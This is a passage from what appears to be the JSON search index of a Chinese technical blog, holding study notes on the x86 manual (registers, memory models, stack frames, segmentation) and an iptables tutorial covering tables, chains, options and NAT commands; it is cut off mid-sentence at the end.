\u504f\u79fb}\u6216\u8005\u7edd\u5bf9\u5730\u5740\u3002\u524d\u4e00\u79cd\u6709\u5229\u4e8e\u94fe\u63a5\u65f6\u7684\u91cd\u5b9a\u4f4d</li> <li> <p>\u7a0b\u5e8f\u5458\u4f7f\u7528\u7b26\u53f7\u6765\u547d\u540d\u5bf9\u8c61\uff0c\u94fe\u63a5\u5668\u4f7f\u7528\u7b26\u53f7\u8fdb\u884c\u94fe\u63a5\u64cd\u4f5c\uff0c\u800c\u8c03\u8bd5\u5668\u5229\u7528\u7b26\u53f7\u8fdb\u884c\u8c03\u8bd5</p> </li> </ul>","tags":["kernel","linux"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/","title":"\u8bfb x86 \u624b\u518c\u8bb0\u5f55","text":"<ul> <li>\u5e38\u89c1\u770b\u540d\u5b57\u731c\u6d4b\u4e0d\u4e86\u529f\u80fd\u7684\u6307\u4ee4</li> <li>\u64cd\u4f5c\u6a21\u5f0f</li> <li>\u5185\u5b58\u7ba1\u7406</li> <li>\u51fd\u6570\u8c03\u7528</li> <li>\u5f02\u5e38</li> <li>ucore<ul> <li>\u6bb5</li> <li>- \u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668\ufa38\u4e2d\u7684 CPL \u5b57\u6bb5\uff082 \u4f4d\uff09\u7684\u503c\u603b\u662f\u7b49\u4e8e CPU \u7684\u5f53\u524d\u7279\u6743\u7ea7\uff0c\u6240\u4ee5\u53ea\u8981\u770b\u2f00\u4e00\u773c CS \u4e2d\u7684 CPL\uff0c\u4f60\u5c31\u53ef\u4ee5\u77e5\u9053 \u6b64\u523b\u7684\u7279\u6743\u7ea7\u4e86\uf9ba\u3002</li> </ul> </li> </ul>","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#\u5e38\u89c1\u770b\u540d\u5b57\u731c\u6d4b\u4e0d\u4e86\u529f\u80fd\u7684\u6307\u4ee4","title":"\u5e38\u89c1\u770b\u540d\u5b57\u731c\u6d4b\u4e0d\u4e86\u529f\u80fd\u7684\u6307\u4ee4","text":"<pre><code>lea //Load Effective Address\n\ntest //Logical Compare, Computes the bit-wise logical AND of first operand \n //(source 1 operand) and the second operand (source 2 operand) and \n //sets the SF, ZF, and PF status flags according to the result. The result is then discarded.\n\nincl //Adds 1 to the destination operand, while preserving the state of the CF flag. \n  //The destination operand can be a register or a memory location. This instruction \n  //allows a loop counter to be updated without disturbing the CF flag. (Use a ADD \n  //instruction with an immediate operand of 1 to perform an increment operation that does updates the CF flag.)\n</code></pre>","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#\u64cd\u4f5c\u6a21\u5f0f","title":"\u64cd\u4f5c\u6a21\u5f0f","text":"<p>IA32</p> <ul> <li>real address mode\uff1a\u7528\u4e8e\u517c\u5bb9 8086\uff0c\u53ea\u80fd\u8bbf\u95ee 1MB \u7a7a\u95f4</li> <li>protected mode\uff1a32 \u4f4d\u4e00\u822c\u60c5\u51b5</li> <li>system management mod</li> </ul> <p>IA64 \u65b0\u589e</p> <ul> <li>Compatiblity mode</li> <li>64-bit mode</li> </ul> <ol> <li>\u8d44\u6e90<p>- \u57fa\u672c\u8d44\u6e90\uff1a\u7528\u4e8e\u6267\u884c\u7528\u6237\u7a0b\u5e8f\u548c\u64cd\u4f5c\u7cfb\u7edf</p> <pre><code>IA32 \u6574\u6570\u90e8\u5206\u5bc4\u5b58\u5668\uff1a\n\n- 8 \u4e2a\u901a\u7528\u5bc4\u5b58\u5668 (32bits)\uff1aEAX, EBX, ECX, EDX, ESI, EDI, **EBP, ESP**\n\n- 6 \u4e2a\u6bb5\u5bc4\u5b58\u5668 (16bits)\uff1a**CS, DS, SS**, ES, FS, GS\n\n- EFLGAS(32bits)\n\n  ![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20211002160142600.png)\n\n- **EIP**(32bits)\n\n![](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20210930192852848.png)\n</code></pre> <p>- \u7279\u6743\u8d44\u6e90\uff1a\u4f5c\u4e3a\u7cfb\u7edf\u7ea7\u67b6\u6784\u7684\u4e00\u90e8\u5206\uff0c\u7528\u4e8e\u652f\u6301\u64cd\u4f5c\u7cfb\u7edf\u548c\u7cfb\u7edf\u7ea7\u8f6f\u4ef6</p> <pre><code>- I/O ports\n- \u63a7\u5236\u5bc4\u5b58\u5668\uff1aCR0-CR4\uff0c\u7528\u4e8e\u63a7\u5236\u5904\u7406\u5668\u7684\u64cd\u4f5c\u6a21\u5f0f\n- \u5185\u5b58\u7ba1\u7406\u5bc4\u5b58\u5668\uff1aGDTR, IDTR, LDTR, ...\n- Performance monitoring counters\uff1a\u7528\u4e8e\u76d1\u63a7\u6027\u80fd\u4e8b\u4ef6\n</code></pre> </li> </ol>","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#\u5185\u5b58\u7ba1\u7406","title":"\u5185\u5b58\u7ba1\u7406","text":"<ol> <li> <p>\u5185\u5b58\u6a21\u578b</p> <ul> <li>Flat memory model: \u7ebf\u6027\u5730\u5740\uff0c0-2^32-1</li> <li>Segmented memory model\uff1a\u5c06\u5185\u5b58\u5206\u4e3a\u4e00\u4e2a\u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4\u79f0\u4e3a\u6bb5\u3002\u5982\u4ee3\u7801\u3001\u6570\u636e\u3001\u6808\u7b49\u90fd\u53ef\u4ee5\u5b58\u653e\u5728\u4e0d\u540c\u7684\u6bb5\u91cc\u3002\u903b\u8f91\u5730\u5740=(segment selector, offset)\u3002\u4e00\u5171\u53ef\u4ee5\u6709 2^14-1 \u4e2a\u6bb5\uff0c\u6bcf\u4e2a\u6bb5\u6700\u5927\u4e3a 2^32B\u3002</li> <li>real-address mode memory model: The real-address mode uses a specific implementation of segmented memory in which the linear address space for the program and the operating system/executive consists of an array of segments of up to 64 KBytes in size each. The maximum size of the linear address space in real-address mode is 2 20  bytes.</li> </ul> </li> <li> <p>\u5206\u9875\u548c\u865a\u62df\u5185\u5b58\uff1a\u65e0\u8bba\u662f flat \u6a21\u5f0f\u8fd8\u662f segemented \u6a21\u5f0f\uff0c\u7ebf\u6027\u5730\u5740\u5747\u901a\u8fc7\u5206\u9875\u6620\u5c04\u5230\u7269\u7406\u5730\u5740\u3002(\u9700\u8981\u5f00\u542f\u5206\u9875)</p> </li> <li> <p>Extended Physical Addressing in Protected Mode Beginning with P6 family processors, the IA-32 architecture supports addressing of up to 64 GBytes (2 36  bytes) of physical memory. A program or task could not address locations in this address space directly. Instead, it addresses individual linear address spaces of up to 4 GBytes that mapped to 64-GByte physical address space through a virtual memory management mechanism. Using this mechanism, an operating system can enable a program to switch 4-GByte linear address spaces within 64-GByte physical address space.</p> <p>The use of extended physical addressing requires the processor to operate in protected mode and the operating system to provide a virtual memory management system. See \u201c36-Bit Physical Addressing Using the PAE Paging Mechanism\u201d in Chapter 3, \u201cProtected-Mode Memory Management,\u201d of the Intel\u00ae 64 and IA-32 Architectures Soft-ware Developer\u2019s Manual, Volume 3A.</p> </li> </ol>","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#\u51fd\u6570\u8c03\u7528","title":"\u51fd\u6570\u8c03\u7528","text":"<ol> <li> <p>stack\uff1a\u4e00\u4e2a\u6808\u5e27\uff0c\u4e3b\u8981\u5305\u542b\u8c03\u7528\u53c2\u6570\u3001\u8fd4\u56de\u5730\u5740\u3001\u5c40\u90e8\u53d8\u91cf\u3002\u901a\u5e38\u6808\u5e95\u4e3a\u9ad8\u5730\u5740\u4f4d</p> </li> <li> <p>aa</p> <p></p> </li> <li> <p>EBP\uff08Stack Base Pointer\uff09\uff1aRET \u4ece\u5f53\u524d\u6808\u9876 (ESP) \u5f39\u6808\uff0c\u5e76\u5f39\u6808\u503c\u5199\u5165 EIP \u4e2d\u3002\u5904\u7406\u5668\u4e0d\u4f1a\u4fdd\u8bc1 RET \u5f39\u6808\u503c\u5c31\u662f\u8fd4\u56de\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u7a0b\u5e8f\u5458\u4fdd\u8bc1\u3002</p> <p>\u5e38\u89c1\u505a\u6cd5\u662f\u5728\u88ab\u8c03\u7528\u51fd\u6570\u7b2c\u4e00\u53e5\uff0c\u5c06 EBP \u8bbe\u7f6e\u4e3a ESP\uff08\u6267\u884c CALL \u540e\uff0c\u5904\u7406\u5668\u5c06 EIP \u538b\u5165\u6808\uff0c\u56e0\u6b64\u6808\u9876\u5373\u5bf9\u5e94\u8fd4\u56de\u5730\u5740\uff09\uff0c\u5728\u8c03\u7528 RET \u8fd4\u56de\u524d\uff0c\u5c06 ESP \u91cd\u8bbe\u4e3a EBP\u3002</p> <p>\u4e0d\u8fc7\u76ee\u524d\u7684\u505a\u6cd5\u4f1a\u5728\u88ab\u8c03\u7528\u51fd\u6570\u7684\u7b2c\u4e00\u53e5\u5148\u5c06 EBP \u538b\u5165\u6808\u4e2d\uff08\u5bf9\u5e94\u4e0a\u4e00\u5c42\u7684 EBP\uff09\uff0c\u518d\u5c06 EBP \u8bbe\u7f6e\u4e3a ESP\u3002</p> <p>\u4e8e\u662f\u6211\u4eec\u4fbf\u6709\u5173\u7cfb\uff1aEBP+4 \u5bf9\u5e94\u5f53\u524d\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u3002\u8fd9\u6837\u4fbf\u53ef\u4ee5\u901a\u8fc7 EBP \u904d\u5386\u6574\u4e2a\u8c03\u7528\u6808</p> <p></p> <pre><code>func:\n    804913b: 55                    push   %ebp\n    804913c: 89 e5                 mov    %esp,%ebp\n    ...\n\n    80491ac: 5d                    pop    %ebp\n    80491ad: c3                    ret    \n</code></pre> </li> <li> <p>\u4f20\u53c2</p> <ul> <li>\u901a\u7528\u5bc4\u5b58\u5668\uff088-2=6\uff09</li> <li>Stack</li> <li>arguement list\uff1a\u4f20\u4e00\u4e2a pointer \u6307\u5411 arguement list\u3002\u4f20\u5927\u91cf\u6570\u636e\u7684\u65b9\u5f0f</li> </ul> <p>\u4fdd\u5b58\u53d8\u91cf\uff1aPUSHA pushes the values in all the general-purpose registers on the stack in the following order: EAX, ECX, EDX, EBX, ESP  (the value prior to executing the PUSHA instruction), EBP, ESI, and EDI.  POPA does the inverse</p> </li> <li> <p>\u5728\u4e0d\u540c\u7279\u6743\u7ea7\u95f4\u8c03\u7528\uff08\u4f1a\u4f7f\u7528\u5230\u5417\uff0c\u4e00\u822c\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u5207\u6362\u7279\u6743\u7ea7\u518d\u8c03\u7528\u7684\u5427\uff1f\uff09</p> </li> <li> <p>\u7ecf\u9a8c\uff1a</p> <ul> <li>0x8(%ebp) \u5bf9\u5e94\u7b2c\u4e00\u4e2a\u53c2\u6570</li> </ul> <ul> <li>\u51fd\u6570\u8fd4\u56de\u503c\u5b58\u50a8\u5728 eax \u4e2d</li> </ul> <ul> <li> <p>enter, leave\uff1aenter \u6709\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u6307\u5b9a\u5206\u914d\u591a\u5927\u7684\u5185\u5b58\u7528\u4e8e\u5b58\u50a8\u51fd\u6570\u5c40\u90e8\u53d8\u91cf (\u7b49\u4ef7\u4e8e\u81ea\u5df1\u6267\u884c sub size, %esp)\uff0c\u4e00\u53e6\u4e00\u4e2a\u4e3a lexical nesting level\uff0c\u4f1a\u5b89\u88c5\u5c42\u6b21\u50a8\u5b58\u7236\u51fd\u6570\u7684 ebp\u3002</p> <p>leave \u6062\u590d enter \u7684\u64cd\u4f5c\u3002\u6bd4\u8f83\u7279\u522b\u7684\u662f\uff0c\u5982\u679c\u4f7f\u7528\u4e86 leave\uff0c\u5c31\u4e0d\u9700\u8981\u81ea\u5df1\u5728\u51fd\u6570\u7ed3\u5c3e pop \u4e86\u3002</p> <p></p> <p></p> </li> </ul> </li> </ol>","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#\u5f02\u5e38","title":"\u5f02\u5e38","text":"","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#ucore","title":"ucore","text":"","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#\u6bb5","title":"\u6bb5","text":"<p>voulme3 chapter3 p2893</p> <p></p> <p>\u542f\u52a8\u5206\u6bb5\u673a\u5236\uff0c\u672a\u542f\u52a8\u5206\u2eda\u9875\u673a\u5236\uff1a\u903b\u8f91\u5730\u5740--&gt; (\u5206\u6bb5\u5730\u5740\u8f6c\u6362) --&gt;\u7ebf\u6027\u5730\u5740=\u7269\u7406\uf9e4\u5730\u5740 \u542f\u52a8\u5206\u6bb5\u548c\u5206\u2eda\u9875\u673a\u5236\uff1a\u903b\u8f91\u5730\u5740--&gt; (\u5206\u6bb5\u5730\u5740\u8f6c\u6362) --&gt;\u7ebf\u6027\u5730\u5740--&gt;\u5206\u2eda\u9875\u5730\u5740\u8f6c\u6362) --&gt;\u7269\u7406\uf9e4\u5730\u5740</p>","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#--\u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668\u5668\u4e2d\u7684-cpl-\u5b57\u6bb52-\u4f4d\u7684\u503c\u603b\u662f\u7b49\u4e8e-cpu-\u7684\u5f53\u524d\u7279\u6743\u7ea7\u6240\u4ee5\u53ea\u8981\u770b\u4e00\u773c-cs-\u4e2d\u7684-cpl\u4f60\u5c31\u53ef\u4ee5\u77e5\u9053-\u6b64\u523b\u7684\u7279\u6743\u7ea7\u4e86\u4e86","title":"- \u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668\ufa38\u4e2d\u7684 CPL \u5b57\u6bb5\uff082 \u4f4d\uff09\u7684\u503c\u603b\u662f\u7b49\u4e8e CPU \u7684\u5f53\u524d\u7279\u6743\u7ea7\uff0c\u6240\u4ee5\u53ea\u8981\u770b\u2f00\u4e00\u773c CS \u4e2d\u7684 CPL\uff0c\u4f60\u5c31\u53ef\u4ee5\u77e5\u9053 \u6b64\u523b\u7684\u7279\u6743\u7ea7\u4e86\uf9ba\u3002","text":"<p>A segment selector is a 16-bit identifier for a segment (see Figure 3-6). It does not point directly to the segment, but instead points to the segment descriptor that defines the segment.</p>","tags":["x86"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/","title":"iptables","text":"<p>iptables</p> <p>iptables is a command line utility for configuring Linux kernel firewall implemented within the Netfilter project.</p> <ul> <li>iptables \u662f linux \u4e0a\u7684\u9632\u706b\u5899\u8f6f\u4ef6</li> <li>\u6709\u4e00\u4e9b\u5de5\u5177\u4f5c\u4e3a iptables \u7684\u524d\u7aef\uff0c\u547d\u4ee4\u66f4\u52a0\u7b80\u5355\u6216\u8005\u6709 GUI\uff08\u5982 ufw \u548c gufw\uff09</li> <li>Note: iptables is a legacy framework, nftables aims to provide a modern replacement including a compatibility layer.</li> </ul>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u539f\u7406","title":"\u539f\u7406","text":"","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#flow-chart","title":"Flow chart","text":"<p>\u5f53\u4e00\u4e2a\u7f51\u7edc\u63a5\u53e3\u4e0a\u63a5\u53d7\u5230\u4e00\u4e2a\u5305\u540e\uff0c\u5185\u6838\u4f1a\u5bf9\u5176\u8fdb\u884c\u4e00\u7cfb\u5217\u5904\u7406\u3002</p> <p>When a packet first enters the firewall, it hits the hardware and then gets passed on to the proper device driver in the kernel. Then the packet starts to go through a series of steps in the kernel, before it is either sent to the correct application (locally), or forwarded to another host - or whatever happens to it.</p> <p></p> <p>)</p> <ul> <li>\u6bcf\u4e00\u4e2a IP \u5305\uff0c\u65e0\u8bba\u6765\u81ea\u54ea\u4e00\u4e2a\u7f51\u7edc\u63a5\u53e3 (network interface)\uff0c\u90fd\u4f1a\u6309\u7167\u8be5\u6d41\u56fe\u5904\u7406</li> <li>\u5927\u81f4\u5206\u4e3a 3 \u79cd\u60c5\u51b5<ul> <li>\u5305\u7684\u76ee\u7684\u662f\u672c\u673a\u7684\u67d0\u4e2a\u8fdb\u7a0b\uff1aPREROUTING --&gt; INPUT --&gt; Local Process</li> <li>\u5982\u679c\u672c\u5730\u8fdb\u7a0b\u4ea7\u751f\u4e00\u4e2a\u5305\uff0c\u4e5f\u9700\u8981\u4e00\u7cfb\u5217\u5904\u7406\u5c06\u5176\u53d1\u9001\u5230\u67d0\u4e2a\u63a5\u53e3\u4e0a\uff1aOUTPUT --&gt; POSTROUTING</li> <li>\u5982\u679c\u5305\u7684\u76ee\u7684\u5730\u5740\u4e0d\u662f\u672c\u673a\uff0c\u5219\u9700\u8981\u8fdb\u884c\u8f6c\u53d1\uff1aPREROUTING --&gt; FORWARD --&gt;  POSTROUTING</li> </ul> </li> </ul>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#tables","title":"Tables","text":"<p>\u9ed8\u8ba4\u5b9e\u73b0\u4e86 4 \u8868\u30015 \u94fe</p> <p></p> <ul> <li>raw\uff1a\u7528\u4e8e\u5728\u5176\u4ed6\u8868\u4e4b\u524d\u8fdb\u884c\u64cd\u4f5c\uff0c\u53ef\u4ee5\u907f\u514d connection tracking</li> <li>filter\uff1a\u4e13\u95e8\u7528\u4e8e filtering packets\uff0c\u5982\u8fdb\u884c DROP, LOG, ACCEPT or REJECT</li> <li>nat\uff1a\u7528\u4e8e\u7f51\u7edc\u5730\u5740\u8f6c\u6362\uff0c\u5982\u7aef\u53e3\u8f6c\u53d1<ul> <li>\u4e0d\u5e94\u8be5\u5728 nat table \u4e0a\u8fdb\u884c filter\uff0c\u56e0\u4e3a nat \u53ea\u4f1a\u5bf9\u4e00\u4e2a\u6d41\u4e2d\u7684\u7b2c\u4e00\u4e2a packet \u8fdb\u884c\u5904\u7406\uff0c\u5176\u5b83\u7684\u5305\u5df2\u7ecf\u6ca1\u6709\u4e86 TCP Header\uff08IP \u5c42\u8fdb\u884c\u4e86\u5206\u7247\uff09\u3002nat table is only traversed by the first packet in a connection</li> </ul> </li> <li> <p>mangle\uff1a\u7528\u4e8e\u4fee\u6539 packet \u7684 header \u4fe1\u606f\uff0c\u5982 TTL, TOS\u3002\u6216\u8005\u5728\u5185\u6838\u7a7a\u95f4\u7ed9 packet \u6253\u4e0a\u6807\u8bb0 (MARK)\uff0c\u5176\u4ed6\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7\u8be5 mark \u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\u3002</p> <p>TTL \u7684\u5947\u5999\u4f5c\u7528\uff0cISP \u5355\u8fde\u63a5\u591a\u8ba1\u7b97\u673a\u68c0\u6d4b\uff1aThe TTL target is used to change the TTL (Time To Live) field of the packet. We could tell packets to only have a specific TTL and so on. One good reason for this could be that we don't want to give ourself away to nosy Internet Service Providers. Some Internet Service Providers do not like users running multiple computers on one single connection, and there are some Internet Service Providers known to look for a single host generating different TTL values, and take this as one of many signs of multiple computers connected to a single connection.</p> </li> </ul> <ul> <li>security: is used for Mandatory Access Control networking rules (e.g. SELinux -- see this article for more details)</li> </ul> <p>\u901a\u5e38\u53ea\u9700\u8981\u4f7f\u7528 filter \u548c nat \u8868\uff0cmangle \u8868\u7528\u4e8e\u66f4\u590d\u6742\u7684\u64cd\u4f5c\u3002</p>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#iptables-\u547d\u4ee4","title":"iptables \u547d\u4ee4","text":"<ul> <li> <p>\u683c\u5f0f</p> <pre><code>iptables [-t table] command [chain] [match] [target/jump]\n</code></pre> </li> </ul> <ul> <li>\u4e0d\u6307\u5b9a-t \u65f6\uff0c\u9ed8\u8ba4\u6307\u5b9a filter \u8868</li> </ul>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u547d\u4ee4\u9009\u9879","title":"\u547d\u4ee4\u9009\u9879","text":"<p>\u67e5\u770b\u3001\u6dfb\u52a0\u3001\u5220\u9664\u6307\u5b9a table \u6307\u5b9a chain \u4e2d\u7684\u89c4\u5219 (rule)</p> <ul> <li>-L chain: \u5217\u51fa\u6307\u5b9a\u94fe\u4e2d\u6240\u6709\u7684\u89c4\u5219\u8fdb\u884c\u67e5\u770b</li> <li>-A chain rule-specification: \u5728\u6307\u5b9a\u94fe chain \u7684\u672b\u5c3e\u63d2\u5165\u6307\u5b9a\u7684\u89c4\u5219\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u6761\u89c4\u5219\u4f1a\u88ab\u653e\u5230\u6700\u540e\uff0c\u6700\u540e\u624d\u4f1a\u88ab\u6267\u884c\u3002\u89c4\u5219\u662f\u7531\u540e\u9762\u7684\u5339\u914d\u6765\u6307\u5b9a\u3002</li> <li>-I chain [rulenum] rule-specification: \u5728\u94fe chain \u4e2d\u7684\u6307\u5b9a\u4f4d\u7f6e\u63d2\u5165\u4e00\u6761\u6216\u591a\u6761\u89c4\u5219\u3002\u5982\u679c\u6307\u5b9a\u7684\u89c4\u5219\u53f7\u662f 1\uff0c\u5219\u5728\u94fe\u7684\u5934\u90e8\u63d2\u5165\u3002\u8fd9\u4e5f\u662f\u9ed8\u8ba4\u7684\u60c5\u51b5\u3002</li> <li>-D chain rulenum: \u5728\u6307\u5b9a\u7684\u94fe chain \u4e2d\u5220\u9664\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u5b9a\u89c4\u5219\u3002</li> <li>-R rulenum\uff1a\u66ff\u6362/\u4fee\u6539\u7b2c\u51e0\u6761\u89c4\u5219</li> </ul> <p>\u521b\u5efa\u3001\u5220\u9664\u65b0\u94fe</p> <ul> <li>-N, --new-chain chain \u7528\u6307\u5b9a\u7684\u540d\u5b57\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u94fe\u3002</li> <li>-X, --delete-chain [chain] \uff1a\u5220\u9664\u6307\u5b9a\u7684\u94fe\uff0c\u8fd9\u4e2a\u94fe\u5fc5\u987b\u6ca1\u6709\u88ab\u5176\u5b83\u4efb\u4f55\u89c4\u5219\u5f15\u7528\uff0c\u800c\u4e14\u8fd9\u6761\u4e0a\u5fc5\u987b\u6ca1\u6709\u4efb\u4f55\u89c4\u5219\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u94fe\u540d\uff0c\u5219\u4f1a\u5220\u9664\u8be5\u8868\u4e2d\u6240\u6709\u975e\u5185\u7f6e\u7684\u94fe\u3002</li> <li>-F, --flush [chain] \u6e05\u7a7a\u6307\u5b9a\u94fe chain \u4e0a\u9762\u7684\u6240\u6709\u89c4\u5219\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u94fe\uff0c\u6e05\u7a7a\u8be5\u8868\u4e0a\u6240\u6709\u94fe\u7684\u6240\u6709\u89c4\u5219\u3002</li> <li>-E, --rename-chain old-chain new-chain\uff1a\u7528\u6307\u5b9a\u7684\u65b0\u540d\u5b57\u53bb\u91cd\u547d\u540d\u6307\u5b9a\u7684\u94fe\u3002\u8fd9\u5e76\u4e0d\u4f1a\u5bf9\u94fe\u5185\u90e8\u9020\u6210\u4efb\u4f55\u5f71\u54cd\u3002</li> <li>-Z, --zero [chain] \uff1a\u628a\u6307\u5b9a\u94fe\uff0c\u6216\u8005\u8868\u4e2d\u7684\u6240\u6709\u94fe\u4e0a\u7684\u6570\u636e\u5305\u8ba1\u6570\u5668\u548c\u6d41\u91cf\u8ba1\u6570\u5668\u5f52\u96f6\u3002</li> <li>-P, --policy chain target\uff1a\u4e3a\u6307\u5b9a\u7684\u94fe chain \u8bbe\u7f6e\u7b56\u7565 target\u3002\u6ce8\u610f\uff0c\u53ea\u6709\u5185\u7f6e\u7684\u94fe\u624d\u5141\u8bb8\u6709\u7b56\u7565\uff0c\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u662f\u4e0d\u5141\u8bb8\u7684\u3002</li> </ul>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u5339\u914d\u9009\u9879","title":"\u5339\u914d\u9009\u9879","text":"<ul> <li>-i\uff1a\u6307\u5b9a\u6570\u636e\u5305\u4ece\u54ea\u4e2a\u63a5\u53e3\u8fdb\u5165</li> <li>-o\uff1a\u6307\u5b9a\u6570\u636e\u5305\u4ece\u54ea\u4e2a\u7f51\u7edc\u63a5\u53e3\u8f93\u51fa</li> <li>-p\uff1a\u6307\u5b9a\u6570\u636e\u5305\u5339\u914d\u7684\u534f\u8bae</li> <li>-s\uff1a\u6307\u5b9a\u6570\u636e\u5305\u5339\u914d\u7684\u6e90\u5730\u5740</li> <li>-sport &lt;\u6e90\u7aef\u53e3\u53f7&gt;\uff1a\u6307\u5b9a\u6570\u636e\u5305\u5339\u914d\u7684\u6e90\u7aef\u53e3\u53f7\uff0c\u53ef\u4ee5\u4f7f\u7528[\u8d77\u59cb\u7aef\u53e3\u53f7\uff1a\u7ed3\u675f\u7aef\u53e3\u53f7]\u7684\u683c\u5f0f\u6307\u5b9a\u4e00\u4e2a\u8303\u56f4\u7684\u7aef\u53e3</li> <li>-d\uff1a\u6307\u5b9a\u6570\u636e\u5305\u5339\u914d\u7684\u76ee\u6807\u5730\u5740</li> <li>-dport &lt;\u76ee\u6807\u7aef\u53e3\u53f7&gt;\uff1a\u6307\u5b9a\u6570\u636e\u5305\u5339\u914d\u7684\u76ee\u6807\u7aef\u53e3\u53f7\uff0c\u53ef\u4ee5\u4f7f\u7528[\u8d77\u59cb\u7aef\u53e3\u53f7\uff1a\u7ed3\u675f\u7aef\u53e3\u53f7]\u7684\u683c\u5f0f\u6307\u5b9a\u4e00\u4e2a\u8303\u56f4\u7684\u7aef\u53e3</li> <li>!: \u5426\u5b9a\u4fee\u9970</li> </ul> <p>p.s. \u8fd8\u6709\u66f4\u9ad8\u7ea7\u7684\u5339\u914d\u9009\u9879\uff0c\u5982 Conntrack \u5339\u914d</p> <pre><code>iptables -A INPUT -p tcp -m conntrack --ctstate RELATED\n</code></pre>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u52a8\u4f5c\u9009\u9879","title":"\u52a8\u4f5c\u9009\u9879","text":"<p>iptables(8) - Linux man page (die.net)</p> <p>p.s \u8bb8\u591a\u52a8\u4f5c (target) \u53ea\u9002\u7528\u4e8e\u7279\u5b9a\u7684 table \u548c chain \u4e2d\uff0c\u9700\u8981\u6ce8\u610f</p> <ul> <li>ACCEPT\uff1a\u63a5\u6536\u6570\u636e\u5305</li> <li>DROP\uff1a\u4e22\u5f03\u6570\u636e\u5305</li> <li>REJECT\uff1a\u4e22\u5f03\u6570\u636e\u5305\uff0c\u5e76\u54cd\u5e94 ICMP \u9519\u8bef\u4fe1\u606f</li> <li>RETURN\uff1a\u8ba9\u89c4\u5219\u904d\u5386\u505c\u6b62\uff0c\u6216\u5219\u8fd4\u56de\u4e0a\u4e00\u6761\u94fe</li> <li>LOG\uff1a\u65e5\u5fd7\u529f\u80fd\uff0c\u5c06\u7b26\u5408\u89c4\u5219\u7684\u6570\u636e\u5305\u7684\u76f8\u5173\u4fe1\u606f\u8bb0\u5f55\u5728\u65e5\u5fd7\u4e2d\uff0c\u4ee5\u4fbf\u7ba1\u7406\u5458\u7684\u5206\u6790\u548c\u6392\u9519</li> </ul>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#nat-\u76f8\u5173","title":"NAT \u76f8\u5173","text":"<ul> <li> <p>SNAT\uff1a\u4fee\u6539 packet \u7684\u6e90\u5730\u5740\uff0c\u5373\u6211\u4eec\u5e38\u7528\u7684 NAT \u529f\u80fd</p> <ul> <li>\u9002\u7528\u8303\u56f4\uff1anat \u8868\uff0cpostrouting \u94fe</li> </ul> <pre><code>iptables -t nat -A POSTROUTING -s 192.168.188.0/24 -j SNAT --to-source 210.14.67.127\n</code></pre> </li> </ul> <ul> <li> <p>MASQUERADE</p> <ul> <li>\u9002\u7528\u8303\u56f4\uff1anat \u8868\uff0cpostrouting \u94fe \u4e0d\u7528\u6307\u5b9a--to-source\uff0c\u7528\u4e8e\u52a8\u6001\u83b7\u5f97\u5730\u5740\uff08\u5982 